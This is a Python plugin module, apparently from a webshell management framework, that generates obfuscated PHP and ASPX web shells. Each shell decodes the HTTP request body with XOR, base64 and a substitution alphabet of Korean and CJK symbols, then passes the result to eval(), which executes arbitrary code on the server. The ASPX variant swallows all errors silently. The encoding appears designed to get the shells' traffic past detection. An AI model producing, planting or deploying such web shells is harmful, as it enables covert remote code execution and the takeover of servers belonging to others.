# obfuscators/CHARS.py

import json
import textwrap
import base64

PARAM_SCHEM = {
    "key" : "secret",
    "encoding" : "utf-8"
}

HELP = 'Substituting chars (please set Encoding to UTF-8)'

B64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
CHAOS_CHARS  = "가나다라마바사아자차카타파하거너더러머버서어저처커허고노도로모보소초코토포호구누두루放佛梵ॐ卐符密玄靈神鬼魂魄陰陽乾坤震巽坎離兌卍"

ENCODE_MAP = str.maketrans(B64_CHARS, CHAOS_CHARS)
DECODE_MAP = str.maketrans(CHAOS_CHARS, B64_CHARS)

dicObfuscator = {
    'PHP' : textwrap.dedent('''
        function Encrypt($data) {
            $key = '[KEY]';
            $b64 = "[B64_CHARS]";
            $nj  = "[CHAOS_CHARS]";

            $xor_out = '';
            $keyLen = strlen($key);
            for ($i = 0; $i < strlen($data); $i++) {
                $xor_out .= chr(ord($data[$i]) ^ ord($key[$i % $keyLen]));
            }

            $b64_str = base64_encode($xor_out);

            $array = preg_split('//u', $nj, -1, PREG_SPLIT_NO_EMPTY);
            $b64_array = str_split($b64);
            $map = array_combine($b64_array, $array);

            $out = '';
            for ($i = 0; $i < strlen($b64_str); $i++) {
                $char = $b64_str[$i];
                $out .= isset($map[$char]) ? $map[$char] : $char;
            }
            return $out;
        }                
    ''').strip().replace('[B64_CHARS]', B64_CHARS).replace('[CHAOS_CHARS]', CHAOS_CHARS),

    'ASPX' : textwrap.dedent('''
        function Encrypt(data : System.Byte[], keyStr : String) : String {
            var key = System.Text.Encoding.UTF8.GetBytes(keyStr);
            var xor_out = new System.Byte[data.Length];
            for (var i = 0; i < data.Length; i++) {
                xor_out[i] = (data[i] ^ key[i % key.Length]);
            }
            var b64_str : String = System.Convert.ToBase64String(xor_out);
            var b64_chars : String = "[B64_CHARS]";
            var chaos_chars : String = "[CHAOS_CHARS]";
            var out_str : String = "";
            for (var j = 0; j < b64_str.Length; j++) {
                var c = b64_str.substring(j, j + 1);
                var idx = b64_chars.indexOf(c);
                out_str += (idx >= 0) ? chaos_chars.substring(idx, idx + 1) : c;
            }
            return out_str;
        }
    ''').strip().replace('[B64_CHARS]', B64_CHARS).replace('[CHAOS_CHARS]', CHAOS_CHARS)
}

dicPayload = {
    'PHP' : textwrap.dedent('''
        <?php
        function decode($str, $key) {
            $b64 = "[B64_CHARS]";
            $nj  = "[CHAOS_CHARS]";
            
            $array = preg_split('//u', $nj, -1, PREG_SPLIT_NO_EMPTY);
            $b64_array = str_split($b64);
            $map = array_combine($array, $b64_array);
            
            $input_array = preg_split('//u', $str, -1, PREG_SPLIT_NO_EMPTY);
            $b64_str = '';
            foreach ($input_array as $char) {
                $b64_str .= isset($map[$char]) ? $map[$char] : $char;
            }
            
            $encrypted = base64_decode($b64_str);
            
            $out = '';
            $keyLen = strlen($key);
            for ($i = 0; $i < strlen($encrypted); $i++) {
                $out .= chr(ord($encrypted[$i]) ^ ord($key[$i % $keyLen]));
            }
            return $out;
        }

        $KEY = "[KEY]";
        $rawInput = file_get_contents("php://input");
        
        $decrypted = decode($rawInput, $KEY);
        
        eval($decrypted);
        ?>
        ''').strip().replace('[B64_CHARS]', B64_CHARS).replace('[CHAOS_CHARS]', CHAOS_CHARS),

    'ASPX' : textwrap.dedent('''
        <%@ Page Language="JScript" %>
        <%
        function decode(str : String, keyStr : String) : String {
            var b64_chars : String = "[B64_CHARS]";
            var chaos_chars : String = "[CHAOS_CHARS]";
            var b64_str : String = "";
            for (var i = 0; i < str.Length; i++) {
                var c = str.substring(i, i + 1);
                var idx = chaos_chars.indexOf(c);
                b64_str += (idx >= 0) ? b64_chars.substring(idx, idx + 1) : c;
            }
            var encrypted : System.Byte[] = System.Convert.FromBase64String(b64_str);
            var key = System.Text.Encoding.UTF8.GetBytes(keyStr);
            var out_bytes = new System.Byte[encrypted.Length];
            for (var j = 0; j < encrypted.Length; j++) {
                out_bytes[j] = (encrypted[j] ^ key[j % key.Length]);
            }
            return System.Text.Encoding.UTF8.GetString(out_bytes);
        }

        try {
            var KEY : String = "[KEY]";
            var inputStream = Request.InputStream;
            var len = inputStream.Length;
            var rawData : System.Byte[] = new System.Byte[len]; 
            inputStream.Read(rawData, 0, len);
            var rawStr : String = System.Text.Encoding.UTF8.GetString(rawData);
            
            var decrypted : String = decode(rawStr, KEY);
            eval(decrypted);
        } catch(e) {}
        %>
        ''').strip().replace('[B64_CHARS]', B64_CHARS).replace('[CHAOS_CHARS]', CHAOS_CHARS)
}

def _xor_crypt(data: bytes, key: bytes) -> bytes:
    out = bytearray()
    key_len = len(key)
    for i, byte in enumerate(data):
        out.append(byte ^ key[i % key_len])
    return bytes(out)

def help(payload, **kwargs):
    return HELP

def obfuscator(payload, script, key, **kwargs):
    if script in dicObfuscator.keys():
        return dicObfuscator[script].replace('[KEY]', key)
    return ''

def build(payload, script, key, **kwargs):
    if script in dicPayload.keys():
        return dicPayload[script].replace('[KEY]', key)
    return ''

def example(payload, **kwargs):
    return json.dumps(PARAM_SCHEM, indent=4)

def available(payload, **kwargs):
    scripts = []
    for script in dicPayload.keys():
        if not script in dicObfuscator.keys():
            continue

        scripts.append(script)

    return ','.join(scripts)

def obfuscate(payload, encoding='utf-8', key="default_key", **kwargs):
    data_bytes = payload.encode(encoding) if isinstance(payload, str) else payload
    key_bytes = key.encode(encoding)
    xor_bytes = _xor_crypt(data_bytes, key_bytes)
    
    b64_str = base64.b64encode(xor_bytes).decode('ascii')
    style_str = b64_str.translate(ENCODE_MAP)
    
    return style_str

def deobfuscate(payload, encoding='utf-8', key="default_key", **kwargs):
    if isinstance(payload, bytes):
        payload = payload.decode(encoding)
        
    b64_str = payload.translate(DECODE_MAP)
    xor_bytes = base64.b64decode(b64_str)
    
    key_bytes = key.encode(encoding)
    decrypted_bytes = _xor_crypt(xor_bytes, key_bytes)
    
    return decrypted_bytes.decode(encoding)